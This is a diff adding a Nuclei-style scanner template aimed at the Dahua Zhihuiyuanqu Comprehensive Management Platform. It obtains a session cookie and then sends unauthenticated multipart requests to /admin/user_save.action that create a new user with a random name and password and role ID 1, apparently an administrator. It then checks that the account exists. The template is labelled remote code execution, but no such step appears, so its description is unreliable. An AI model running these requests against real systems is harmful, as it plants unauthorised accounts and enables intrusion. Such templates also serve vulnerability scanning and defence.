@@ -1,0 +1,165 @@
+id: dahua-zhihuiyuanqu-rce
+info:
+  name: Dahua Zhihuiyuanqu Comprehensive Management Platform Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    Exploits a remote code execution vulnerability in the Dahua Zhihuiyuanqu Comprehensive Management Platform.
+
+variables:
+  r_boundary: '{{rand_base(10, "abcdefghijklmnopqrstuvwxyz")}}'
+  r_username: '{{rand_base(10, "abcdefghijklmnopqrstuvwxyz")}}'
+  r_password: '{{rand_base(10, "abcdefghijklmnopqrstuvwxyz")}}'
+
+http:
+  - id: session-init
+    method: GET
+    path:
+      - "{{BaseURL}}/admin/sso_initSession.action"
+    extractors:
+      - type: regex
+        name: session
+        group: 1
+        regex:
+          - "JSESSIONID=([^;]+)"
+        part: header
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "JSESSIONID"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+
+  - id: create-user
+    method: POST
+    path:
+      - "{{BaseURL}}/admin/user_save.action"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----{{r_boundary}}"
+      Cookie: "JSESSIONID={{session}}"
+    body: |
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="userBean.userType"
+
+      0
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="userBean.ownerCode"
+
+      001
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="userBean.isReuse"
+
+      0
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="userBean.macStat"
+
+      0
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="userBean.roleIds"
+
+      1
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="userBean.loginName"
+
+      {{r_username}}
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="displayedOrgName"
+
+      {{r_username}}
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="userBean.loginPass"
+
+      {{r_password}}
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="checkPass"
+
+      {{r_password}}
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="userBean.groupId"
+
+      0
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="userBean.userName"
+
+      {{r_username}}
+      ------{{r_boundary}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - len(body) == 0
+
+  - id: verify-user
+    method: POST
+    path:
+      - "{{BaseURL}}/admin/user_save.action"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----{{r_boundary}}"
+      Cookie: "JSESSIONID={{session}}"
+    body: |
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="userBean.userType"
+
+      0
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="userBean.ownerCode"
+
+      001
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="userBean.isReuse"
+
+      0
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="userBean.macStat"
+
+      0
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="userBean.roleIds"
+
+      1
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="userBean.loginName"
+
+      {{r_username}}
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="displayedOrgName"
+
+      {{r_username}}
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="userBean.loginPass"
+
+      {{r_password}}
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="checkPass"
+
+      {{r_password}}
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="userBean.groupId"
+
+      0
+      ------{{r_boundary}}
+      Content-Disposition: form-data; name="userBean.userName"
+
+      {{r_username}}
+      ------{{r_boundary}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "validationError"
